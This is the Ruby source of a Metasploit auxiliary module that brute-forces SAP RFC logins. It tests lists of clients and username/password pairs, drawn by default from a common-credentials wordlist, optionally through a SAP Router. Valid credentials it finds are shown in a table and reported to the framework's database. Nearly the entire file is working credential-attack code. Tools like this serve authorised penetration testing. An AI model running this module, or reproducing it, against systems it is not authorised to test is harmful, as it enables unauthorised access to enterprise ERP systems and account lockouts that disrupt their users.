##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

##
# This module is based on, inspired by, or is a port of a plugin available in the Onapsis Bizploit Opensource ERP Penetration Testing framework - http://www.onapsis.com/research-free-solutions.php.
# Mariano Nunez (the author of the Bizploit framework) helped me in my efforts in producing the Metasploit modules and was happy to share his knowledge and experience - a very cool guy.
# Id also like to thank Chris John Riley, Ian de Villiers and Joris van de Vis who have Beta tested the modules and provided excellent feedback. Some people just seem to enjoy hacking SAP :)
##

require 'msf/core'

class Metasploit4 < Msf::Auxiliary

  include Msf::Exploit::SAP
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::AuthBrute

  def initialize
    super(
      'Name' => 'SAP RFC Brute Forcer',
      'Description'    => %q{
        This module attempts to brute force the username | password via an RFC interface.
        Default clients can be tested without needing to set a CLIENT.
        Common/Default user and password combinations can be tested without needing to set a USERNAME, PASSWORD, USER_FILE or PASS_FILE.
        The default usernames and password combinations are stored in ./data/wordlists/sap_rfc_common.txt.
        This module can execute through a SAP Router if SRHOST and SRPORT values are set.
        The module requires the NW RFC SDK from SAP as well as the Ruby wrapper nwrfc (http://rubygems.org/gems/nwrfc).
      },
      'References'     => [[ 'URL', 'http://labs.mwrinfosecurity.com' ]],
      'Author'         => ['nmonkee'],
      'License'        => BSD_LICENSE
      )

      register_options(
      [
        Opt::RPORT(3342),
        OptString.new('CLIENT', [true, 'Client can be single (066), comma seperated list (000,001,066) or range (000-999)', '000,001,066']),
        OptString.new('SRHOST', [false, 'SAP Router Address', nil]),
        OptString.new('SRPORT', [false, 'SAP Router Port Number', nil]),
        OptPath.new('USERPASS_FILE', [ false, "File containing users and passwords separated by space, one pair per line",
           File.join(Msf::Config.data_directory, "wordlists", "sap_rfc_common.txt") ])
      ], self.class)
    end

  def run_host(ip)

    $success = false

    $saptbl = Msf::Ui::Console::Table.new(
              Msf::Ui::Console::Table::Style::Default,
              'Header'  => "[SAP] Credentials",
              'Prefix'  => "\n",
              'Postfix' => "\n",
              'Indent'  => 1,
              'Columns' =>
                          [
                           "host",
                           "port",
                           "client",
                           "user",
                           "pass",
                           "status"
                          ])

     client_list.each do |client|
       each_user_pass do |user, pass|
         brute_user(user,client,pass,datastore['rhost'],datastore['rport'],system_number)
       end
     end

     if $success
       print($saptbl.to_s)
       return
     end
   end

   def brute_user(user, client, pass, rhost, rport, sysnr)
   ashost = rhost

  if datastore['SRHOST']
#    if datastore['SRPORT']
      ashost = "/H/#{datastore['SRHOST']}/H/#{rhost}"
#    end
  end

   print_status("#{rhost}:#{rport} [SAP] Trying client: '#{client}'")

   begin
     auth_hash = {"user" => user, "passwd" => pass, "client" => client, "ashost" => ashost, "sysnr" => sysnr}
     conn = Connection.new(auth_hash)
   rescue NWError => e
    vprint_error("#{rhost}:#{rport} [SAP] login failed - credentials incorrect for client: #{client} username: #{user} password: #{pass}") if e.message =~ /Name or password is incorrect/
    vprint_error("#{rhost}:#{rport} [SAP] login failed - client #{client} does not exist") if e.message =~ /not available in this system/
    vprint_error("#{rhost}:#{rport} [SAP] login failed - communication failure (refused)") if e.message =~ /Connection refused/
    vprint_error("#{rhost}:#{rport} [SAP] login failed - communication failure (unreachable)") if e.message =~ /No route to host/
    vprint_error("#{rhost}:#{rport} [SAP] login failed - communication failure (hostname unknown)") if e.message =~ /unknown/
     $saptbl << [rhost, rport, client, user, pass, 'pass change'] if e.message =~ /Password must be changed/
     $saptbl << [rhost, rport, client, user, pass, 'locked'] if e.message =~ /Password logon no longer possible - too many failed attempts/
     return
   end

   begin
     conn.connection_info
     $saptbl << [rhost, rport, client, user, pass, '']
     $success = true
   rescue
     print_error("#{rhost}:#{rport} [SAP] something went wrong :(")
     return
   end

   conn.disconnect

   $success = true

   if $success
     report_auth_info(
                      :host => rhost,
                      :sname => 'sap-gateway',
                      :proto => 'tcp',
                      :port => rport,
                      :client => client,
                      :user => user,
                      :pass => pass,
                      :sysnr => sysnr,
                      :source_type => "user_supplied",
                      :target_host => rhost,
                      :target_port => rport
                     )
    end
  end
end

